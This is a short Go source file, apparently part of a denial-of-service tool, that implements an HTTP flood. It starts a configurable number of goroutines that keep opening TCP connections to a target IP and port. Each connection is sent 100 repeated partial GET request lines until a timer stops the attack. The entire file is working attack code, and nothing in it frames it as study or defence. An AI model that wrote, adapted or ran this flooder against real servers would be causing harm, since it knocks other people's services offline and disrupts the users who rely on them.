package main

/*
	The "structure" was based on https://github.com/Konstantin8105/DDoS
*/

import (
	"fmt"
	"net"
	"time"
)

type http_f struct {
	ip      string
	port    int
	threads int
	running *chan bool
}

func new_http_f(ip string, port int, threads int) *http_f {
	s := make(chan bool)

	return &http_f{
		ip:      ip,
		port:    port,
		threads: threads,
		running: &s,
	}
}

func (attack *http_f) run_http_f() {
	for i := 0; i < attack.threads; i++ {
		go func() {
			for {
				select {
				case <-(*attack.running):
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", attack.ip, attack.port))

					if err == nil {
						for i := 0; i < 100; i++ {
							conn.Write([]byte("GET / HTTP/1.1\r\n"))
						}

						conn.Close()
					}
				}
			}
		}()
	}
}

func (attack *http_f) stop_http_f() {
	for i := 0; i < attack.threads; i++ {
		(*attack.running) <- true
	}

	close(*attack.running)
}

func http_flood(ip string, port int, timeout int, thread int) {
	attack := new_http_f(ip, port, thread)
	attack.run_http_f()

	time.Sleep(time.Second * time.Duration(timeout))

	attack.stop_http_f()
}